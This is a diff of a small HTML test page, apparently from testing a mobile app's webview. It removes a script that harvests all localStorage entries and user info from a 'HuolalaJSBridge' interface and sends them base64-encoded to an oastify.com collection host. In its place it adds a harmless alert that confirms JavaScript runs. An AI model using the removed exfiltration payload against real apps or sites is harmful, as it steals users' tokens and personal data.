@@ -1,30 +1,18 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Test</title>
+</head>
 <body>
-  <h2>Processing...</h2>
+  <h2>Test Page</h2>
+
+  <!-- 关键：先确认 JS 能跑 -->
   <script>
-    // 1. 窃取所有 localStorage
-    const leak = {};
-    for (let key in localStorage) {
-      leak[key] = localStorage.getItem(key);
-    }
+    // 弹窗（最直观）
+    alert("JS executed! localStorage count: " + Object.keys(localStorage).length);
 
-    // 2. 编码为 URL 参数（避免特殊字符问题）
-    const params = new URLSearchParams();
-    params.append('data', btoa(unescape(encodeURIComponent(JSON.stringify(leak)))));
-
-    // 3. 用 <img> 发送（GET 请求）
-    const img = new Image();
-    img.src = 'http://jqdlkosrfaznvo3i1j67c4oo6fc60wol.oastify.com/leak?' + params.toString();
-
-    // 4. 可选：也尝试 JSBridge
-    if (window.HuolalaJSBridge?.getUserInfo) {
-      HuolalaJSBridge.getUserInfo((res) => {
-        const img2 = new Image();
-        img2.src = 'http://jqdlkosrfaznvo3i1j67c4oo6fc60wol.oastify.com/bridge?' + 
-                   new URLSearchParams({ bridge: JSON.stringify(res) });
-      });
-    }
+    // 日志（备用）
+    console.log("LocalStorage:", localStorage);
   </script>
 </body>
 </html>
